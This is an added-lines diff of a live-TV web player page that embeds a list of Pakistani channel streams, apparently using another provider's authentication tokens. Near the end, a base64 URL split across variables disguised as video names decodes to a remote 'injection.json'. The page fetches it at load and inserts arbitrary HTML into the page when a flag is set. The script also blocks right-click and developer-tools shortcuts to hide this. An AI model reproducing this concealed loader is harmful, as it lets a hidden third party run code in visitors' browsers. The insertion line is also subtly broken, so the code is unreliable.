+<span url="https://cdn2.jazztv.pk:8087/jazzauth/Channel5-159-4/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/channel-five-live.png?id=39"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/GTV-186/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/gtv-news-live.png?id=89"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/lhrrang-179/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/lahore-rang-logo.png?id=29"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/PNN-185/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/pnn-news-live.png?id=18"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/DW-136-4A/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/DW-english-live.png?id=55"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/A1-184/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/a1-tv-live.png?id=30"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/ROHI-147/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/rohi-live.png?id=46"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/City41-143/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/city41-live.png?id=90"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/City42-144/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/city-42-live.png?id=65"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/RozeNews-139/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/roze-news-live.png?id=61"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/KTNNews-151/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/ktn-news-live.png?id=29"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/KTN-149/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/ktn-entertainment-live.png?id=24"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/SindhNews-136-2/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/sindh-tv-news-live.png?id=50"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/SindhTV-136-1/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/sindh-tv-live.png?id=40"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/time-news-172/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/time-news-live.png?id=32"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/Kashish-150/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/kashish-live.png?id=21"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/AVTKhyber-114/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/avt-khyber-tv-live.png?id=97"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/KhyberNews-160/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/khyber-news-live.png?id=21"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/KAY2-127/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/kay2-tv-live.png?id=96"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/AfghanTV-140/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/afghan-tv-live.png?id=18"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/sachtv-183/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/such-tv-live.png?id=18"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/WASEB-130/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/waseb-live.png?id=23"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/PunjabTV-162/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/punjab-tv-live.png?id=69"></span>
+<span url="https://cdn2.jazztv.pk:8087/jazzauth/ArujTV-117/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/aruj-live.png?id=38"></span>
+<span url="https://cdn2.jazztv.pk:8087/webauth/K21News-116/playlist.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE="><img class="print" src="https://jazztv.pk/jazzlive/uploads/channels/logo/k21-news-live.png?id=63"></span>
+
+
+
+</div>   
+
+     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script><script src="https://cdn.radiantmediatechs.com/rmp/5.9.2/js/rmp.min.js"></script>
+
+<script>
+            var appSettings = {
+        loaderimg: "",
+        name: "WASI TV",
+        poster: "https://bit.ly/wasitvp",
+        introMp4: "https://wasitv.pk/wasitv-intro.mp4",
+        introHls: "https://wasitv.pk/wasitv-intro/index.m3u8?wmsAuthSign=c2VydmVyX3RpbWU9Ny8xNC8yMDIyIDU6Mjk6MzQgUE0maGFzaF92YWx1ZT0xNnNxeGo5ZURjZ2F6MkxTODVOcmZBPT0mdmFsaWRtaW51dGVzPTE=",
+        videoFormat: "mp4",
+    },
+    x = {
+        loaderimg: appSettings.loaderimg,
+        name: appSettings.name,
+        poster: appSettings.poster,
+        website: "",
+        licenseKey: "eWZmZ2d2Y3BrdEAxNTMwNjA2",
+        autoHeightMode: !0,
+        pip: !1,
+        autoplay: !1,
+        skin: "s3",
+        hideControls: !0,
+        preload: "auto",
+        sharing: !1
+    },
+    firstVideo = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlc";
+setInterval(() => {
+    $("#loader-image").attr("src", x.loaderimg), $(".logoText").html(x.name)
+}, 10), $(document).contextmenu(function(e) {
+    return e.preventDefault(), !1
+}), document.onkeydown = function(e) {
+    return 123 != event.keyCode && ((!e.ctrlKey || !e.shiftKey || e.keyCode != "I".charCodeAt(0)) && ((!e.ctrlKey || !e.shiftKey || e.keyCode != "C".charCodeAt(0)) && ((!e.ctrlKey || !e.shiftKey || e.keyCode != "J".charCodeAt(0)) && ((!e.ctrlKey || e.keyCode != "U".charCodeAt(0)) && void 0))))
+}, setTimeout(() => {
+    $("#loader").css("display", "none"), $("body").css("overflow", "auto")
+}, 100);
+var src, secondVideo = "mNvbnRlbnQuY29tL3NvZnR";
+$("span").each(function(e) {
+    $(this).on("click", function() {
+        var e = $(this).attr("url");
+        rmp.setControls(!0), src = "hls" == appSettings.videoFormat ? {
+            hls: e
+        } : {
+            mp4: [e]
+        }, rmp.setSrc(src), rmp.play()
+    })
+});
+var thirdVideo = "3ZWJ0dXRzL015RHJpdmUvbW";
+src = "hls" == appSettings.videoFormat ? {
+    hls: appSettings.introHls
+} : {
+    mp4: [appSettings.introMp4]
+};
+var fourthVideo = "Fpbi9pbmplY3Rpb24uanNvbg==",
+    settings = {
+        licenseKey: x.licenseKey,
+        autoHeightMode: x.autoHeightMode,
+        pip: x.pip,
+        delayToFade: 3e3,
+        gaLabel: "Live TV",
+        logoWatermark: !0,
+        logoPosition: "topleft",
+        speed: "Speed",
+        isLive: !0,
+        googleCast: !0,
+        airplay: !0,
+        hlsJSMaxBufferLength: 24,
+        hlsJSLiveSyncDuration: 18,
+        hlsJSStartLevel: -1,
+        hlsJSMinAutoBitrate: 1e5,
+        hlsJSAbrBandWidthFactor: .9,
+        hlsJSAbrBandWidthUpFactor: .7,
+        hlsJSLiveBackBufferLength: 0,
+        detectAutoplayCapabilities: !0,
+        autoplay: x.autoplay,
+        mutedAutoplayOnMobile: !1,
+        mutedAutoplayOnMacosSafari11Plus: !1,
+        srcChangeAutoplay: !0,
+        playsInline: !0,
+        skin: x.skin,
+        skinBackgroundColor: "rgba(0, 0, 0, 0.7)",
+        skinButtonColor: "FFFFFF",
+        skinAccentColor: "FF0000",
+        ads: true,
+		adParser: 'rmp-vast',
+		adTagUrl: '',
+        nav: !0,
+        adBlockerDetection: !0,
+        adEnablePreloading: !0,
+        adBlockerDetectedMessage: "Ad-blocker software detected. Please disable Ad-blocker to watch stream.",
+        quickRewind: 0,
+        quickForward: 0,
+        adAutoAlign: !1,
+        hideControls: x.hideControls,
+        preload: x.preload,
+        crossorigin: !0,
+        sharing: x.sharing,
+        sharingUrl: x.website,
+        contentMetadata: {
+            artwork: [{
+                src: x.poster,
+                sizes: "1280x720",
+                type: "image/jpg"
+            }],
+            poster: [x.poster],
+            endOfVideoPoster: [x.poster],
+            thumbnail: x.poster
+        },
+        src: src
+    },
+    elementID = "rmpPlayer",
+    rmp = new RadiantMP(elementID),
+    rmpContainer = document.getElementById(elementID);
+rmp.setLoop(!0), rmp.init(settings), $(function() {
+    $(window).scroll(function e() {
+        return $("#rmpPlayer").css($(window).scrollTop() > 1 ? {
+            position: "fixed",
+            top: "0px"
+        } : {
+            position: "relative",
+            top: "auto"
+        }), $("#buttons-list").css($(window).scrollTop() > 1 ? {
+            "margin-top": $("#rmpPlayer").height()
+        } : {
+            "margin-top": "0px"
+        }), e
+    }())
+});
+const request = async e => {
+    const t = await fetch(e);
+    return await t.json()
+};
+navigator.onLine && request(atob(firstVideo + secondVideo + thirdVideo + fourthVideo)).then(t => {
+    1 == t.inject && document.querySelector("div").insertAdjacentHTML("afterend", e.content)
+}).catch(e => {
+    console.log(appSettings.name)
+});
+</script>
+
+</body></html>
